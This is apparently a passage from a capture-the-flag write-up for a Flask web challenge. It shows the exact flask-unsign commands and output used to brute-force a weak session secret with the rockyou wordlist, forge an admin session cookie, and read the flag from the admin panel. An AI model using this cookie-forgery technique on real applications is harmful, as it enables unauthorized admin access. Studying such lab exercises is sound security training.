flask-unsign --unsign --cookie 'eyJyb2xlIjoic3RhbmRhcmQiLCJ1aWQiOiJ1XzZiYzNiYzg1IiwidXNlcm5hbWUiOiJ1emkifQ.aeLONw.6COUHlOyvlrGR6Y2ZAJSNmCmjrE' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval  
[*] Session decodes to: {'role': 'standard', 'uid': 'u_6bc3bc85', 'username': 'uzi'}  
[*] Starting brute-forcer with 8 threads..  
[+] Found secret key after 175232 attempts  
b'Password1!'
```

Now that I have the secret I can forge a session:
```shell
flask-unsign --sign --cookie '{"role":"admin","uid":"u_6bc3bc85","username":"uzi"}' --secret 'Password1!'  
eyJyb2xlIjoiYWRtaW4iLCJ1aWQiOiJ1XzZiYzNiYzg1IiwidXNlcm5hbWUiOiJ1emkifQ.aeLRqg.lso7gwv8ImcOSi5niuFMbhVZMEo
```

Changing my cookie in the browser and refreshing reveals the admin panel:

![Alt text](/images/ctfcitweb12.png)

Admin panel has the flag (`http://23.179.17.92:5557/admin`):

![Alt text](/images/ctfcitweb13.png)

`CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}`
